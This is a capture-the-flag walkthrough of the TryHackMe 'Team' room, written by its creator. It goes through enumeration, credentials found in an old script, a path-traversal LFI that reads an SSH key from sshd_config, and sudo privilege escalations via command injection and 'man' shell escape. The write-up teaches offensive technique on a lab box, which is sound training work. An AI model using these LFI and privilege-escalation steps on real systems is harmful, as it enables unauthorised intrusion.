---
layout: post
author: dalemazza
title: THM - Team Walkthrough
date: 2021-01-14
category: THM
tags: THM
published: true
excerpt_separator: <!--more-->
---

<p align="center">
  <img class="image" width="auto" height="auto" src="https://imgur.com/9vuyWVz.png">
</p>



* Platform: **THM**
* Difficulty: **Medium**
* Flags: **2**

This is a box I personally made, this is my first time making content and hope you all enjoy it!!
<!--more-->
This is a room on [Try Hack Me](). It is a full Pwn box meaning you have to go from unauthenticated to system privileges to finish the challenge, gaining 2 flags along the way.

This challenge includes the following techniques:  
* nmap
* ffuf
* LFI
* ZAP
* Sudo priv esc's

---
## nmap scan
```bash
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 bb:79:72:81:b4:e0:4c:d8:85:d9:ae:7a:83:31:82:98 (RSA)
|   256 15:14:d5:f3:05:96:61:4a:06:33:1a:48:6b:70:b6:8b (ECDSA)
|_  256 00:c4:4d:63:d7:ec:60:ff:af:a3:00:4c:2d:fc:77:4b (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Team
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

```
---
## FTP

First lets check the FTP for anonymous access or default credentials. After trying all the credentials, I found none to work.
```bash
ftp 192.168.88.129
Connected to 192.168.88.129.
220 (vsFTPd 3.0.3)
Name (192.168.88.129:kali): anonymous
331 Please specify the password.
Password:
530 Login incorrect.
Login failed.
ftp>
```
---
## Port 80 Webserver

After browsing to the IP address I was presented with the following Apache 2 default landing page.

<p align="center">
  <img class="image" width="auto" height="auto" src="https://imgur.com/qDRBgfn.png">
</p>

After checking this page for any comments in the source, I remember seeing the HTTP Title in the `nmap` results was `Team` lets add this to my hosts file like so.

Edit the /etc/hosts file like so

`sudo vi /etc/hosts`

I added the following on line 3

```bash
127.0.0.1	localhost
127.0.1.1	kali
192.168.88.129 	team.thm
# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```
This is a feature called virtual hosts in apache2. I recommend reading up on them.

Success! we have a site now.

<p align="center">
  <img class="image" width="auto" height="auto" src="https://imgur.com/S5Xl8E4.png">
</p>


After some basic enumeration of the site I found nothing in the comments or anything on the site I saw as an attack vector.

---
## ffuf - Directory fuzzing

Now I use `ffuf` which is a fuzzing script, this finds directorys on the website.

I use a script I wrote for `ffuf` which allows me to select from options to run ffuf scans rather than remember the long syntax. If you are interested you can find it [here](https://github.com/dalemazza/ffufez)

I found the following with the extensions `.html,.txt`

```bash
images                  [Status: 301, Size: 305, Words: 20, Lines: 10]
[INFO] Adding a new job to the queue: http://team.thm/images/FUZZ
scripts                 [Status: 301, Size: 306, Words: 20, Lines: 10]
[INFO] Adding a new job to the queue: http://team.thm/scripts/FUZZ
assets                  [Status: 301, Size: 305, Words: 20, Lines: 10]
[INFO] Adding a new job to the queue: http://team.thm/assets/FUZZ
index.html              [Status: 200, Size: 2966, Words: 140, Lines: 90]
robots.txt              [Status: 200, Size: 5, Words: 1, Lines: 2]
server-status           [Status: 403, Size: 296, Words: 22, Lines: 12]
thumbs                  [Status: 301, Size: 312, Words: 20, Lines: 10]
[INFO] Adding a new job to the queue: http://team.thm/images/thumbs/FUZZ
script.txt              [Status: 200, Size: 597, Words: 52, Lines: 22]
```
Lets look into the `scripts` dir. Looks like we don't have access to it. Looking at the results from `ffuf` there is a `script.txt` in the scripts folder.

Lets try browse to this
`http://team.thm/scripts/script.txt`

It Works!

```bash
#!/bin/bash
read -p "Enter Username: " REDACTED
read -sp "Enter Username Password: " REDACTED
echo
ftp_server="localhost"
ftp_username="$Username"
ftp_password="$Password"
mkdir /home/username/linux/source_folder
source_folder="/home/username/source_folder/"
cp -avr config* $source_folder
dest_folder="/home/username/linux/dest_folder/"
ftp -in $ftp_server <END_SCRIPT
quote USER $ftp_username
quote PASS $decrypt
cd $source_folder
!cd $dest_folder
mget -R *
quit

# Updated version of the script
# Note to self had to change the extension of the old "script" in this folder, as it has creds in
```
It seems to be some sort of script, I notice that parts of it has been redacted. It mentions that the old script had its extension changed to hide it. Maybe we can find it?

Some extensions are used for old files I set up a `ffuf` scan for the  `/scripts/` dir with the following extensions `.bak,.old,.new`. Here are the results

```bash
script.old              [Status: 200, Size: 468, Words: 27, Lines: 19]
```
Got a hit.

```bash
#!/bin/bash
read -p "Enter Username: " CREDS
read -sp "Enter Username Password: " CREDS
echo
ftp_server="localhost"
ftp_username="$Username"
ftp_password="$Password"
mkdir /home/username/linux/source_folder
source_folder="/home/username/source_folder/"
cp -avr config* $source_folder
dest_folder="/home/username/linux/dest_folder/"
ftp -in $ftp_server <END_SCRIPT
quote USER $ftp_username
quote PASS $decrypt
cd $source_folder
!cd $dest_folder
mget -R *
quit
```

Now we have some creds! This script is using the `FTP` service. Lets enumerate it!

```bash
Connected to 192.168.88.129.
220 (vsFTPd 3.0.3)
Name (192.168.88.129:kali): ftpuser
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
dr-xr-xr-x    2 65534    65534        4096 Jan 13 21:14 workshare
226 Directory send OK.
ftp> cd workshare
250 Directory successfully changed.
ftp> dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rwxr-xr-x    1 0        0             269 Jan 13 21:14 New_site.txt
226 Directory send OK.
ftp> get New_site.txt -
remote: New_site.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for New_site.txt (269 bytes).
Dale
	I have started coding a new website in PHP for the team to use, this is currently under development. It can be
found at ".dev" within our domain.

Also as per the team policy please make a copy of your "id_rsa" and place this in the relevent config file.

Gyles
226 Transfer complete.
269 bytes received in 0.00 secs (223.1906 kB/s)
```

Somebody has left a note, It mentions that a new site is being developed and is available at `.dev`, Also It mentions that team policy is that they have to back up their id_rsa keys to a config file?

First add the newly found domain to our hosts like so<p>&nbsp;</p>
`sudo nano /etc/hosts`

```
192.168.88.129 team.thm dev.team.thm
```
<p align="center">
  <img class="image" width="auto" height="auto" src="https://imgur.com/po2POiX.png">
</p>
---
## LFI

This site does not contain much. After clicking the link on the page it takes me to `teamshare.php` page. This URL may be susceptible to LFI as it is using the `?page=teamshare.php` Lets check this

First lets try and see a file we know exists

`http://dev.team.thm/script.php?page=/../../../../../../../etc/passwd`

<p align="center">
  <img class="image" width="auto" height="auto" src="https://imgur.com/cABxEud.png">
</p>


SUCCESS!

After looking around for any files I thought interesting I found nothing, the note I found in the `FTP` mentioned they stored `id_rsa` in a config file. Lets do some LFI FUZZING!

---
## LFI FUZZ

For this I used ZAP to FUZZ the LFI with the following wordlist to look for any config files on the system

Wordlist- `https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt`


* Run a Manual Explore on the following address http://dev.team.thm/script.php?page=/../../../../../../../etc/passwd
* Right click the history line with the correct URL on and go to Attack then Fuzz
* Highlight the following /etc/passwd and select add then add again
* From the drop down bar select file then browse to the LFI woprdlist /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt Then add again
* Click ok then start fuzzer

If you are unsure what this is doing, basically for every line in the wordlist e.g `/etc/shadow` it will append this where you have placed the mask i.e `/etc/passwd`

So `http://dev.team.thm/script.php?page=/../../../../../../../etc/passwd` will become this `http://dev.team.thm/script.php?page=/../../../../../../../etc/shadow`

This is a very fast way of finding files via an LFI.

Under the `fuzzer` tab you can find all the requests it tried. If you filter the body via size you can see all the files that was found as they have a size greater then 0 like so

<p align="center">
  <img class="image" width="auto" height="auto" src="https://imgur.com/njKdaoo.png">
</p>


After looking through them I found the following file `/etc/ssh/sshd_config` contained an `id_rsa` for the account `dale`
Take this and save it. Remember to remove all the # and chmod 600 it.

---
## SSH access

Now login to SSH

`ssh -i id_rsa dale@192.168.88.129`

We now have a SSH connection as the user `dale`

Grab the `user.txt` flag

`cat user.txt`

---
## Priv esc 1

Doing `sudo -l` shows the following
```bash
Matching Defaults entries for dale on TEAM:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dale may run the following commands on TEAM:
    (gyles) NOPASSWD: /home/gyles/admin_checks
```
Lets see what this script does

```bash
#!/bin/bash

printf "Reading stats.\n"
sleep 1
printf "Reading stats..\n"
sleep 1
read -p "Enter name of person backing up the data: " name
echo $name  >> /var/stats/stats.txt
read -p "Enter 'date' to timestamp the file: " error
printf "The Date is "
$error 2>/dev/null

date_save=$(date "+%F-%H-%M")
cp /var/stats/stats.txt /var/stats/stats-$date_save.bak

printf "Stats have been backed up\n"
```
This script is taking user input and assigning this to the value of `$error` and then sending this straight to the shell. THIS IS A NO NO!

Where the script asks for `date` if you supply it with `/bin/bash` This will spawn a bash shell. Due to the fact that we have ran this as the `gyles` this bash shell will belong to him

```bash
dale@TEAM:~$ sudo -u gyles /home/gyles/admin_checks
Reading stats.
Reading stats..
Enter name of person backing up the data: anon
Enter 'date' to timestamp the file: /bin/bash
The Date is id
uid=1001(gyles) gid=1003(editors) groups=1003(editors)
```
No we have a shell as gyles! Although this shell is quite basic.

---
## Root Priv Esc

This shell is quite resrictive due to it being launched from the script.

After enumeration I found `sudo -l` reveal the following
```bash
sudo -l
Matching Defaults entries for gyles on TEAM:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User gyles may run the following commands on TEAM:
    (root) NOPASSWD: /usr/bin/man
```
Gyles can run `man` as root. This can lead to privilege escalation as man can spawn a shell like so

```bash
sudo man man

!/bin/bash
```
You now have a root shell on the box.

I really hope you enjoyed my box!
